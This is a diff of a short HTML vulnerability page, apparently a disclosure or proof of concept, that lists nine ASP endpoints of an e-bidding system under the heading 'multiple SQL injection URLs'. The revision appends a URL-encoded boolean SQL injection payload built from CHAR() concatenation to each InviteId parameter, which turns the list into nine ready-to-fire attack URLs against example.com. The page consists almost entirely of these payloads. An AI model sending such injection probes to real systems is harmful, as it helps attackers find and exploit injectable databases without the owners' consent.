@@ -1,17 +1,22 @@
 <meta charset="UTF-8">
 <div>
     <h3>多处SQL注入URL: </h3>
-    <ul>
-        <p>/Rat/ebid/viewInvite3.asp?InviteId=0000002852</p>
-        <p>/Rat/ebid/viewInvite4.asp?InviteId=0000002852</p>
-        <p>/Rat/ebid/viewInvite5.asp?InviteId=0000002852</p>
-        <p>/Rat/ebid/viewInvite6.asp?InviteId=0000002852</p>
-        <p>/Rat/ebid/viewInvite2.asp?InviteId=0000002852</p>
-        <p>/Rat/ebid/viewInvite1.asp?InviteId=0000002852</p>
-        <p>/Rat/EBid/ViewClarify1.asp?InviteId=11</p>
-        <p>/Rat/EBid/ViewClarify.asp?InviteId=11</p>
-        <p>/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11</p>
-    </ul>
-    <h3>GET-payload: </h3>
-    <code>%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <code>1. http://example.com/Rat/ebid/viewInvite3.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>2. http://example.com/Rat/ebid/viewInvite4.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>3. http://example.com/Rat/ebid/viewInvite5.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>4. http://example.com/Rat/ebid/viewInvite6.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>5. http://example.com/Rat/ebid/viewInvite2.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>6. http://example.com/Rat/ebid/viewInvite1.asp?InviteId=0000002852%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>7. http://example.com/Rat/EBid/ViewClarify1.asp?InviteId=11%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>8. http://example.com/Rat/EBid/ViewClarify.asp?InviteId=11%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
+    <code>9. http://example.com/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--</code>
+    <br>
 </div>
